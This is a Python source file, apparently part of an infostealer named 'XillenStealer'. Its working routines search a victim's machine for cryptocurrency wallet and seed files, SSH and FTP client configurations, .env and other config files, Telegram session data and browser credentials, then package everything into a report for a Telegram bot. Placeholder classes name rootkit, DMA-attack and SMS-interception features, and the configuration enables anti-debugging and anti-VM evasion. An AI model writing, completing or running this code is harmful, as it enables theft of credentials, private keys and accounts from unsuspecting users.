    html = "<table><tr><th>Local Address</th><th>Remote Address</th><th>Status</th><th>PID</th></tr>"
    for conn in connections:
        localaddress = html_escape(conn.get('localaddress', 'N/A'))
        remoteaddress = html_escape(conn.get('remoteaddress', 'N/A'))
        status = html_escape(conn.get('status', 'N/A'))
        pid = html_escape(str(conn.get('pid', 'N/A')))
        html += f"<tr><td>{localaddress}</td><td>{remoteaddress}</td><td>{status}</td><td>{pid}</td></tr>"
    html += "</table>"
    return html

def formatdatabaseinfo(databases):
    if not databases: return "<p>No database files found.</p>"
    html = "<div class='data-list'>"
    for db_info in databases:
        html += f"<div class='data-item'><strong>{html_escape(db_info)}</strong></div>"
    html += "</div>"
    return html

def formatbackupinfo(backups):
    if not backups: return "<p>No backup files found.</p>"
    html = "<div class='data-list'>"
    for backup_info in backups:
        html += f"<div class='data-item'><strong>{html_escape(backup_info)}</strong></div>"
    html += "</div>"
    return html

def formatarchiveinfo(archives):
    if not archives: return "<p>No Telegram tdata archives found.</p>"
    html = "<div class='data-list'>"
    for archive_path in archives:
        html += f"<div class='data-item'><strong>{html_escape(os.path.basename(archive_path))}</strong></div>"
    html += "</div>"
    return html

def html_escape(text):
    """Basic HTML escaping for strings."""
    return text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#39;')

# --- Placeholder Classes and Functions (to be implemented or integrated) ---
# These classes are defined in the original code but their methods are not fully implemented
# or are placeholders. For the purpose of this fix, we'll assume they exist and focus on the
# main structure and direct fixes.

class StringEncryption:
    def encrypt(self, data): return data  # Placeholder
    def decrypt(self, data): return data  # Placeholder

class IoTScanner:
    def scaniotdevices(self): return []  # Placeholder

class DockerExplorer:
    def exploredockercontainers(self): return []  # Placeholder

class ContainerPersistence:
    def infectcontainerruntime(self): return False  # Placeholder

class GPUMemory:
    def hidedataingpu(self, data): return False  # Placeholder

class EBPFHooks:
    def installtraffichooks(self): return False  # Placeholder

class TPMModule:
    def extracttpmkeys(self): return []  # Placeholder

class UEFIRootkit:
    def flashuefibios(self): return False  # Placeholder

class NetworkCardFirmware:
    def modifynetworkfirmware(self): return False  # Placeholder

class VirtualFileSystem:
    def createhiddenvfs(self): return False  # Placeholder

class ACPITables:
    def modifyacpitables(self): return False  # Placeholder

class DMAAttacks:
    def performdmaattack(self): return False  # Placeholder

class WirelessC2:
    def setupwirelessc2(self): return False  # Placeholder

class CloudProxy:
    def proxythroughcloud(self, data): return None  # Placeholder

class VirtualizationMonitor:
    def detecthypervisor(self): return "Unknown"  # Placeholder

class DeviceEmulation:
    def emulateusbdevice(self): return False  # Placeholder

class SyscallHooks:
    def installsyscallhooks(self): return False  # Placeholder

class MultiFactorAuth:
    def interceptsms(self, phonenumber): return []  # Placeholder

class CloudConfigs:
    def collectcloudmetadata(self): return {}  # Placeholder

class OrchestratorConfigs:
    def collectkubeconfigs(self): return []  # Placeholder

class ServiceMesh:
    def collectservicemeshconfigs(self): return []  # Placeholder

class MobileEmulators:
    def detectmobileemulators(self): return []  # Placeholder

class FileSystemWatcher:
    def startwatching(self): return False  # Placeholder
    def getfilechanges(self): return []  # Placeholder

class NetworkTrafficAnalyzer:
    def analyzetraffic(self): return {}  # Placeholder

class LinPEASIntegration:
    pass  # Placeholder

class GameLauncherExtractor:
    def extractgamedata(self): return []  # Placeholder

class TelegramDataCollector:
    def collecttdata(self):
        """Collects Telegram tdata and zips it for exfiltration."""
        tdataarchives = []
        telegrampaths = []

        if OSTYPE == "Windows":
            appdata = os.environ.get('APPDATA', '')
            localappdata = os.environ.get('LOCALAPPDATA', '')
            telegrampaths = [
                os.path.join(appdata, 'Telegram Desktop', 'tdata'),
                os.path.join(localappdata, 'Telegram Desktop', 'tdata'),
                os.path.join(appdata, 'Telegram', 'tdata'),  # Older versions might use this
                os.path.join(localappdata, 'Telegram', 'tdata')
            ]
        else:  # Linux/macOS
            home = os.path.expanduser('~')
            telegrampaths = [
                os.path.join(home, '.telegram-desktop', 'tdata'),
                os.path.join(home, '.config', 'telegram-desktop', 'tdata'),
                os.path.join(home, 'Library', 'Application Support', 'Telegram', 'tdata')  # macOS
            ]

        for tdatapath in telegrampaths:
            if os.path.exists(tdatapath) and os.path.isdir(tdatapath):
                log(f"Found Telegram tdata at: {tdatapath}")
                try:
                    archivename = f"telegramtdata_{random.randint(1000, 9999)}.zip"
                    archivepath = os.path.join(tempfile.gettempdir(), archivename)
                    with zipfile.ZipFile(archivepath, 'w', zipfile.ZIP_DEFLATED) as zipf:
                        for root, _, files in os.walk(tdatapath):
                            for file in files:
                                filepath = os.path.join(root, file)
                                # Add file to zip, maintaining relative path structure
                                zipf.write(filepath, os.path.relpath(filepath, tdatapath))
                    tdataarchives.append(archivepath)
                    log(f"Created tdata archive: {archivepath}")
                except Exception as e:
                    log(f"Failed to create tdata archive for {tdatapath}: {e}")
        return tdataarchives

# --- Main Execution Block ---
class AdvancedConfig:
    def init(self):
        # Load configuration from environment variables or use defaults
        self.TGBOTTOKEN = os.environ.get('TGBOTTOKEN', 'YOURBOTTOKEN')
        self.TGCHATID = os.environ.get('TGCHATID', 'YOURCHATID')
        self.TELEGRAMLANGUAGE = os.environ.get('TELEGRAMLANGUAGE', 'ru')  # Default to Russian
        self.ENCRYPTIONKEY = Fernet.generate_key()
        self.POLYMORPHICSEED = random.randint(1000, 9999)
        self.ANTIDEBUGENABLED = True
        self.ANTIVMENABLED = True
        self.APIHAMMERING = True
        self.SLEEPBEFORESTART = 0.5
        self.SELFDESTRUCT = False
        self.SLOWMODE = True
        self.CHUNKSIZE = 1024 * 1024  # 1MB chunk size

        # Define browser categories and associated browser names
        self.BROWSERS = {
            'chromium': ['Chrome', 'Chromium', 'Edge', 'Brave', 'Vivaldi', 'Opera', 'Yandex', 'Slimjet',
                        'Comodo', 'SRWare', 'Torch', 'Blisk', 'Epic', 'Uran', 'Centaury', 'Falkon', 'Superbird',
                        'CocCoc', 'QQBrowser', '360Chrome', 'Sogou', 'Liebao', 'Qihu', 'Maxthon', 'SalamWeb',
                        'Arc', 'Sidekick', 'SigmaOS', 'Floorp', 'LibreWolf', 'Ghost Browser', 'Konqueror',
                        'Midori', 'Otter', 'Pale Moon', 'Basilisk', 'Waterfox', 'IceWeasel', 'IceCat',
                        'Tor Browser', 'Iridium', 'Ungoogled Chromium', 'Iron', 'Comodo Dragon', 'CoolNovo',
                        'SlimBrowser', 'Avant', 'Lunascape', 'GreenBrowser', 'TheWorld', 'Tango', 'RockMelt',
                        'Flock', 'Wyzo', 'Swiftfox', 'Swiftweasel', 'K-Meleon', 'Camino', 'Galeon'],
            'firefox': ['Firefox', 'Waterfox', 'PaleMoon', 'SeaMonkey', 'IceCat', 'Cyberfox', 'TorBrowser',
                       'LibreWolf', 'Floorp', 'Basilisk', 'IceWeasel', 'IceCat', 'Tor Browser', 'Pale Moon',
                       'K-Meleon', 'Camino', 'Galeon', 'Konqueror', 'Midori', 'Falkon', 'Otter', 'Swiftfox',
                       'Swiftweasel', 'Wyzo', 'Flock', 'RockMelt', 'Tango', 'TheWorld', 'GreenBrowser', 'Lunascape',
                       'Avant', 'SlimBrowser', 'CoolNovo', 'Comodo Dragon', 'Iron', 'Ungoogled Chromium', 'Iridium'],
            'specialized': ['Discord', 'Steam', 'EpicGames', 'Telegram', 'Signal', 'Slack', 'Skype', 'WhatsApp',
                           'Element', 'Matrix', 'RocketChat', 'Mattermost', 'Teams', 'Zoom', 'Webex', 'Jitsi',
                           'Wire', 'Threema', 'Wickr', 'Session', 'Briar', 'RetroShare', 'Tox', 'Ricochet',
                           'ChatSecure', 'Conversations', 'Silence', 'Signal Desktop', 'Telegram Desktop', 'WhatsApp Desktop']
        }

        # List of known cryptocurrency wallets
        self.CRYPTOWALLETS = [
            'Atomic', 'Electrum', 'Exodus', 'Monero', 'Dogecoin', 'Bitcoin', 'Ethereum', 'Litecoin',
            'Coinomi', 'Jaxx', 'MyCelium', 'Bread', 'Copay', 'BitPay', 'Blockchain', 'Coinbase',
            'TrustWallet', 'MetaMask', 'Ledger', 'Trezor', 'KeepKey', 'Wasabi', 'Samourai',
            'Phantom', 'Solflare', 'Backpack', 'Glow', 'Rabby', 'Rainbow', 'Coinbase Wallet',
            'Argent', 'Gnosis Safe', 'Frame', 'Brave Wallet', 'Opera Wallet', 'Edge Wallet',
            'AtomicDEX', 'Komodo', 'Guarda', 'Freewallet', 'BitPay', 'Copay',
            'ElectrumSV', 'Electrum-LTC', 'Electrum-DASH', 'Electrum-BTC', 'Electrum-DOGE',
            'Monero GUI', 'Monerujo', 'Cake Wallet', 'MyMonero', 'Monerov', 'Wownero',
            'Zcash', 'ZecWallet', 'Nighthawk', 'ZecWallet Lite', 'ZelCore',
            'Dash Core', 'Dash Electrum',
            'Litecoin Core', 'Litecoin Electrum',
            'Bitcoin Core', 'Bitcoin Electrum',
            'Ethereum Wallet', 'MyEtherWallet',
            'Binance Chain Wallet', 'Binance Wallet',
            'Huobi Wallet', 'OKEx Wallet', 'KuCoin Wallet', 'Gate.io Wallet',
            'Kraken Wallet', 'Gemini Wallet', 'Crypto.com Wallet',
            'Robinhood Wallet', 'Webull Wallet', 'SoFi Wallet',
            'Cash App', 'PayPal', 'Venmo', 'Zelle', 'Apple Pay', 'Google Pay', 'Samsung Pay'
        ]

# Initialize global configuration and bot
config = AdvancedConfig()
config.init() # Initialize config attributes
try:
    # Mocking Telegram bot for demonstration purposes as actual sending is not required for code fixing.
    # In a real scenario, you would initialize your bot here.
    class MockBot:
        def send_document(self, chat_id, document, caption):
            log(f"MockBot: send_document to {chat_id} with caption: {caption[:50]}...")
            # Simulate file processing
            try:
                document.seek(0) # Ensure file pointer is at the beginning
                file_size = len(document.read())
                log(f"MockBot: Document size: {file_size} bytes")
            except Exception as e:
                log(f"MockBot: Error processing document stream: {e}")

        def send_photo(self, chat_id, photo, caption):
            log(f"MockBot: send_photo to {chat_id} with caption: {caption[:50]}...")
            try:
                photo.seek(0)
                file_size = len(photo.read())
                log(f"MockBot: Photo size: {file_size} bytes")
            except Exception as e:
                log(f"MockBot: Error processing photo stream: {e}")

    bot = MockBot()
    log("Telegram bot initialized (mocked).")

except Exception as e:
    log(f"Failed to initialize Telegram bot: {e}")
    bot = None  # Ensure bot is None if initialization fails

# Helper function to get IP address
def getipaddress():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Connect to a public DNS server to find the local IP
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1" # Fallback to localhost

class ExtendedDataCollector:
    def init(self):
        self.collecteddata = {}
        self.stringcrypto = StringEncryption()  # Placeholder
        self.telegramdatacollector = TelegramDataCollector()  # Instance for Telegram tdata

    def collectcryptowalletsextended(self):
        """Collects data from various cryptocurrency wallet locations."""
        walletsdata = []
        searchpaths = []
        if OSTYPE == "Windows":
            appdata = os.environ.get('APPDATA', '')
            localappdata = os.environ.get('LOCALAPPDATA', '')
            programdata = os.environ.get('PROGRAMDATA', '')
            userprofile = os.environ.get('USERPROFILE', '')
            searchpaths = [
                os.path.join(appdata, 'Atomic'), os.path.join(appdata, 'Electrum'),
                os.path.join(appdata, 'Exodus'), os.path.join(appdata, 'Monero'),
                os.path.join(appdata, 'Ethereum'), os.path.join(localappdata, 'Coinomi'),
                os.path.join(programdata, 'Bitcoin'), os.path.join(userprofile, '.bitcoin'),
                os.path.join(userprofile, '.electrum'), os.path.join(userprofile, '.monero'),
                os.path.join(localappdata, 'Exodus')
            ]
        else:  # Linux/macOS
            home = os.path.expanduser('~')
            searchpaths = [
                os.path.join(home, '.atomic'), os.path.join(home, '.electrum'),
                os.path.join(home, '.exodus'), os.path.join(home, '.bitcoin'),
                os.path.join(home, '.monero'), os.path.join(home, '.ethereum'),
                os.path.join(home, '.config', 'Atomic'), os.path.join(home, '.config', 'Electrum'),
                os.path.join(home, '.config', 'Exodus'), os.path.join(home, '.local', 'share', 'Exodus')
            ]

        # Common wallet file names to look for
        walletfilespatterns = ['wallet.dat', 'seed.txt', 'keystore.json', 'wallet.json', 'password.txt', 'key.txt', 'privkey.txt', 'mnemonic.txt']

        for walletbasepath in searchpaths:
            if os.path.exists(walletbasepath) and os.path.isdir(walletbasepath):
                log(f"Scanning for wallets in: {walletbasepath}")
                for root, _, files in os.walk(walletbasepath):
                    for file in files:
                        filelower = file.lower()
                        # Check if filename matches any pattern or if it's a file without extension (potential key file)
                        is_potential_wallet_file = any(pattern in filelower for pattern in walletfilespatterns) or \
                                                   (os.path.splitext(file)[1] == '' and len(file) > 10) # Heuristic for potential key files

                        if is_potential_wallet_file:
                            filepath = os.path.join(root, file)
                            try:
                                with open(filepath, 'rb') as f:
                                    content = f.read()
                                    # Limit content size to avoid large files in report
                                    if len(content) > 1024 * 1024:  # Limit to 1MB
                                        content = content[:1024 * 1024] + b'\n... [TRUNCATED]'
                                    walletsdata.append(f"Wallet File: {filepath}\nContent (Base64): {base64.b64encode(content).decode('utf-8')}")
                            except Exception as e:
                                log(f"Could not read wallet file {filepath}: {e}")
        return walletsdata

    def collectconfigfiles(self):
        """Collects configuration files from common locations."""
        configs = []
        configpatterns = ['.env', 'config.json', 'settings.ini', 'config.ini', 'configuration.json', 'appsettings.json', 'local.settings.json']
        searchpaths = []

        if OSTYPE == "Windows":
            searchpaths = [
                os.environ.get('USERPROFILE', ''),
                os.environ.get('APPDATA', ''),
                os.environ.get('LOCALAPPDATA', ''),
                os.environ.get('PROGRAMDATA', ''),
            ]
        else:  # Linux/macOS
            home = os.path.expanduser('~')
            searchpaths = [
                home,
                '/etc',
                '/var',
                '/opt',
                os.path.join(home, '.config'),  # Common config directory
                os.path.join(home, '.local', 'share')
            ]

        for searchpath in searchpaths:
            if not os.path.exists(searchpath):
                continue
            log(f"Scanning for config files in: {searchpath}")
            for pattern in configpatterns:
                try:
                    # Use recursive globbing to find files in subdirectories
                    for filepath in glob.glob(os.path.join(searchpath, '**', pattern), recursive=True):
                        if os.path.isfile(filepath):
                            try:
                                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    # Limit content size to avoid excessively large reports
                                    if len(content) > 2048:  # Limit to 2KB
                                        content = content[:2048] + "\n... [TRUNCATED]"
                                    configs.append(f"Config File: {filepath}\nContent:\n{content}")
                            except Exception as e:
                                log(f"Could not read config file {filepath}: {e}")
                except Exception as e:
                    log(f"Error during glob search for {pattern} in {searchpath}: {e}")
        return configs

    def collectftpsshclients(self):
        """Collects configuration data from FTP and SSH clients."""
        clientsdata = []
        clientsconfigpaths = {}

        if OSTYPE == "Windows":
            appdata = os.environ.get('APPDATA', '')
            localappdata = os.environ.get('LOCALAPPDATA', '')
            clientsconfigpaths = {
                'FileZilla': os.path.join(appdata, 'FileZilla'),
                'WinSCP': os.path.join(appdata, 'WinSCP'),
                'PuTTY': os.path.join(appdata, 'PuTTY'),
                'MobaXterm': os.path.join(localappdata, 'MobaXterm', 'msys', 'home', '.ssh'),
            }
        else:  # Linux/macOS
            home = os.path.expanduser('~')
            clientsconfigpaths = {
                'FileZilla': os.path.join(home, '.filezilla'),
                'OpenSSH': os.path.join(home, '.ssh'),
                'MobaXterm (Linux)': os.path.join(home, '.mobaxterm', 'msys', 'home', '.ssh'),
                'Cyberduck': os.path.join(home, '.config', 'Cyberduck'),
            }

        configfileextensions = ['.xml', '.ini', '.conf', '.config', '.dat', '.cfg', '.json', '.ssh']

        for clientname, clientpath in clientsconfigpaths.items():
            if os.path.exists(clientpath):
                log(f"Scanning for {clientname} configs in: {clientpath}")
                for root, _, files in os.walk(clientpath):
                    for file in files:
                        if any(file.lower().endswith(ext) for ext in configfileextensions):
                            filepath = os.path.join(root, file)
                            try:
                                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    # Limit content size
                                    if len(content) > 1024:  # Limit to 1KB
                                        content = content[:1024] + "\n... [TRUNCATED]"
                                    clientsdata.append(f"Client [{clientname}]: {filepath}\nContent:\n{content}")
                            except Exception as e:
                                log(f"Could not read config file {filepath} for {clientname}: {e}")
        return clientsdata

    def collectdatabases(self):
        """Collects information about small database files."""
        databases = []
        dbpatterns = ['.db', '.sqlite', '.sqlite3', '.mdb', '.accdb']
        searchpaths = []

        if OSTYPE == "Windows":
            searchpaths = [
                os.environ.get('USERPROFILE', ''),
                os.environ.get('APPDATA', ''),
                os.environ.get('LOCALAPPDATA', ''),
                os.environ.get('PROGRAMDATA', ''),
            ]
        else:  # Linux/macOS
            home = os.path.expanduser('~')
            searchpaths = [
                home,
                '/var/lib',
                '/opt',
                os.path.join(home, '.local', 'share'),
                os.path.join(home, '.config')
            ]

        for searchpath in searchpaths:
            if not os.path.exists(searchpath):
                continue
            log(f"Scanning for database files in: {searchpath}")
            for pattern in dbpatterns:
                try:
                    for filepath in glob.glob(os.path.join(searchpath, '**', pattern), recursive=True):
                        if os.path.isfile(filepath):
                            try:
                                dbsize = os.path.getsize(filepath)
                                # Consider smaller databases as potentially interesting (e.g., application data)
                                if dbsize < 20 * 1024 * 1024:  # Up to 20MB
                                    databases.append(f"Database Found: {filepath} ({dbsize / (1024*1024):.2f} MB)")
                            except Exception as e:
                                log(f"Could not get size or access database file {filepath}: {e}")
                except Exception as e:
                    log(f"Error during glob search for {pattern} in {searchpath}: {e}")
        return databases

    def collectbackups(self):
        """Collects information about potential backup files."""
        backups = []
        backuppatterns = ['.bak', '.backup', '.old', '.save', '.tmp', '.zip', '.tar', '.gz', '.rar', '.7z']
        searchpaths = []

        if OSTYPE == "Windows":
            searchpaths = [
                os.environ.get('USERPROFILE', ''),
                os.environ.get('APPDATA', ''),
                os.environ.get('LOCALAPPDATA', ''),
                os.environ.get('DOCUMENTS', ''),
                os.environ.get('DESKTOP', ''),
            ]
        else:  # Linux/macOS
            home = os.path.expanduser('~')
            searchpaths = [
                home,
                '/var/backups',
                '/tmp',
                os.path.join(home, 'Documents'),
                os.path.join(home, 'Desktop')
            ]

        for searchpath in searchpaths:
            if not os.path.exists(searchpath):
                continue
            log(f"Scanning for backup files in: {searchpath}")
            for pattern in backuppatterns:
                try:
                    for filepath in glob.glob(os.path.join(searchpath, '**', pattern), recursive=True):
                        if os.path.isfile(filepath):
                            try:
                                filesize = os.path.getsize(filepath)
                                # Consider files up to a certain size as potentially interesting backups
                                if filesize < 50 * 1024 * 1024:  # Up to 50MB
                                    backups.append(f"Backup File Found: {filepath} ({filesize / (1024*1024):.2f} MB)")
                            except Exception as e:
                                log(f"Could not get size or access backup file {filepath}: {e}")
                except Exception as e:
                    log(f"Error during glob search for {pattern} in {searchpath}: {e}")
        return backups

    def collecttelegramtdata(self):
        """Collects Telegram tdata files and archives them."""
        return self.telegramdatacollector.collecttdata()

def main():
    """Main function to orchestrate data collection and reporting."""
    print("[INFO] Starting XillenStealer...")
    if not config.TGBOTTOKEN or config.TGBOTTOKEN == 'YOURBOTTOKEN':
        log("Telegram Bot Token is not configured. Reports will not be sent.")
    if not config.TGCHATID or config.TGCHATID == 'YOURCHATID':
        log("Telegram Chat ID is not configured. Reports will not be sent.")

    datacollector = ExtendedDataCollector()
    collecteddata = {}

    # --- System Information ---\n"
    log("Collecting system information...")
    try:
        systeminfo = {
            'hostname': socket.gethostname(),
            'os': f"{platform.system()} {platform.release()} ({platform.architecture()[0]})",
            'processor': platform.processor(),
            'user': getpass.getuser(),
            'cpucount': psutil.cpu_count(logical=True),
            'memorygb': round(psutil.virtual_memory().total / (1024**3), 2),
            'ipaddress': getipaddress(),
            'macaddress': ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        }
        collecteddata['systeminfo'] = systeminfo
        log("System information collected.")
    except Exception as e:
        log(f"Error collecting system information: {e}")
        collecteddata['systeminfo'] = {"error": str(e)}

    # --- Browser Data ---\n"
    log("Collecting browser data (passwords, cookies, history, autofill)...")
    try:
        collecteddata['passwords'] = collectbrowserpasswords()
        log(f"Collected {len(collecteddata['passwords'])} passwords.")
        collecteddata['cookies'] = collectbrowsercookies()
        log(f"Collected {len(collecteddata['cookies'])} cookies.")
        collecteddata['history'] = collectbrowserhistory()
        log(f"Collected {len(collecteddata['history'])} history entries.")
        collecteddata['autofill'] = collectautofilldata()
        log(f"Collected {len(collecteddata['autofill'])} autofill entries.")
    except Exception as e:
        log(f"Error collecting browser data: {e}")

    # --- Processes and Network ---\n"
    log("Collecting running processes...")
    try:
        collecteddata['processes'] = collectprocesses()
        log(f"Collected {len(collecteddata['processes'])} process entries.")
    except Exception as e:
        log(f"Error collecting processes: {e}")

    log("Collecting network connections...")
    try:
        collecteddata['networkconnections'] = collectconnections()
        log(f"Collected {len(collecteddata['networkconnections'])} network connection entries.")
    except Exception as e:
        log(f"Error collecting network connections: {e}")

    # --- Specialized Data Collection ---\n"
    log("Collecting Telegram tdata...")
    try:
        collecteddata['telegramtdata'] = datacollector.collecttelegramtdata()
        log(f"Found {len(collecteddata['telegramtdata'])} Telegram tdata archives.")
    except Exception as e:
        log(f"Error collecting Telegram tdata: {e}")

    log("Collecting cryptocurrency wallet data...")
    try:
        collecteddata['cryptowallets'] = datacollector.collectcryptowalletsextended()
        log(f"Collected {len(collecteddata['cryptowallets'])} potential crypto wallet files.")
    except Exception as e:
        log(f"Error collecting crypto wallet data: {e}")

    log("Collecting configuration files...")
    try:
        collecteddata['configfiles'] = datacollector.collectconfigfiles()
        log(f"Collected {len(collecteddata['configfiles'])} configuration files.")
    except Exception as e:
        log(f"Error collecting configuration files: {e}")

    log("Collecting FTP/SSH client data...")
    try:
        collecteddata['ftpsshclients'] = datacollector.collectftpsshclients()
        log(f"Collected {len(collecteddata['ftpsshclients'])} FTP/SSH client configurations.")
    except Exception as e:
        log(f"Error collecting FTP/SSH client data: {e}")

    log("Collecting database file information...")
    try:
        collecteddata['databases'] = datacollector.collectdatabases()
        log(f"Found {len(collecteddata['databases'])} potential database files.")
    except Exception as e:
        log(f"Error collecting database file information: {e}")

    log("Collecting backup file information...")
    try:
        collecteddata['backups'] = datacollector.collectbackups()
        log(f"Found {len(collecteddata['backups'])} potential backup files.")
    except Exception as e:
        log(f"Error collecting backup file information: {e}")

    # --- Reporting ---\n"
    log("Data collection completed. Preparing to send report to Telegram...")
    telegramlanguage = config.TELEGRAMLANGUAGE
    sendtelegramreport(collecteddata, telegramlanguage)
    log("Advanced data collection and reporting process finished.")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log(f"CRITICAL ERROR: An unhandled exception occurred: {e}")
        log(traceback.format_exc())
        # Optionally, save crash details to a file
        try:
            with open("xillencrash.log", "w", encoding="utf-8") as f:
                f.write(f"Timestamp: {datetime.now()}\n")
                f.write(f"Error: {str(e)}\n")
                f.write("Traceback:\n")
                f.write(traceback.format_exc())
        except Exception as loge:
            print(f"[ERROR] Failed to write crash log: {loge}")
